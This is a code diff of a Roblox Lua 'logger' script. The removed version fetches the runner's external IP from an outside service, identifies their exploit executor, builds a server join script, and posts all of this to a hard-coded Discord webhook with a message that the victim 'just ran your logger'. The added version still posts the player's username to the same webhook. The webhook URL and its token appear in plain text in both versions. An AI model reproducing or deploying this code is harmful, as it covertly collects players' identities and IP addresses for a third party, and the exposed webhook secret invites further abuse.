@@ -1,53 +1,59 @@
--- Generates the join script
-local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(join_script) -- Fixed typo, now prints the actual join script
+-- Client-side script inside StarterPlayerScripts
+local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
 
--- Check executor
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or 
-   pebc_execute and "ProtoSmasher" or 
-   syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or 
-   SONA_LOADED and "Sona" or 
-   "Kid with shit exploit"
+-- The Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1336821097412165632/b2CpLDrUyQCIioFeqE1t3fTLsQTuZ8rJ1hm9hSS0Ilk5E2Ma59x9lskkguhMtAw704uw"
 
--- Fetch the external IP (this will send a request to an external API to fetch the IP)
-local external_ip = game:GetService("HttpService"):GetAsync("http://api.ipify.org?format=json")
-local parsed_ip = game:GetService("HttpService"):JSONDecode(external_ip).ip
+-- Player's username
+local username = player.Name
 
--- Webhook URL
-local url = "https://discord.com/api/webhooks/1336821097412165632/b2CpLDrUyQCIioFeqE1t3fTLsQTuZ8rJ1hm9hSS0Ilk5E2Ma59x9lskkguhMtAw704uw"
+-- The message content to be sent to Discord
+local message = "**User Info:**\n**Username:** " .. username
 
+-- Construct the JSON payload
 local data = {
-    ["username"] = "Cooked", -- Webhook name
-    ["avatar_url"] = "https://[Log in to view URL]", -- Avatar image URL
-    
-    ["content"] = " @everyone **" .. game.Players.LocalPlayer.Name .. "** just ran your logger", -- Normal message
-    ["embeds"] = {
+    username = "Logger Bot",  -- Bot name
+    content = message,  -- Content to send
+    embeds = {
         {
-            ["title"] = "** " .. game.Players.LocalPlayer.Name .. " just ran your logger**",
-            ["description"] = "**Username: " .. game.Players.LocalPlayer.Name .. "\nExternal IP: " .. parsed_ip .. "\nUses: " .. webhookcheck .. "**",
-            ["type"] = "rich",  -- Embed type
-            ["color"] = 14680319,  -- Color of the embed
-            ["footer"] = {
-                ["text"] = "" .. join_script .. "",  -- Sends the join script
-            },
-        },
+            title = "User Logger",
+            description = "Details of the user who triggered the logger.",
+            color = 16711680,  -- Red color
+            footer = {
+                text = "Roblox Logger Script"
+            }
+        }
     }
 }
 
--- Encoding the data to JSON format
-local newdata = game:GetService("HttpService"):JSONEncode(data)
+-- Encode the data into JSON format
+local jsonData = HttpService:JSONEncode(data)
 
--- Headers for the HTTP request
+-- Define the headers for the POST request
 local headers = {
-    ["content-type"] = "application/json"
+    ["Content-Type"] = "application/json"
 }
 
--- Select the correct request function based on the executor
-request = http_request or request or HttpPost or syn.request
+-- Send the HTTP request to the Discord webhook
+local function sendToWebhook()
+    local requestData = {
+        Url = webhookUrl,
+        Body = jsonData,
+        Method = "POST",
+        Headers = headers
+    }
+    
+    local success, response = pcall(function()
+        HttpService:RequestAsync(requestData)
+    end)
+    
+    if success then
+        print("Successfully sent data to Discord!")
+    else
+        print("Failed to send data to Discord: " .. response)
+    end
+end
 
--- Sending the POST request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+-- Call the function to send the data
+sendToWebhook()
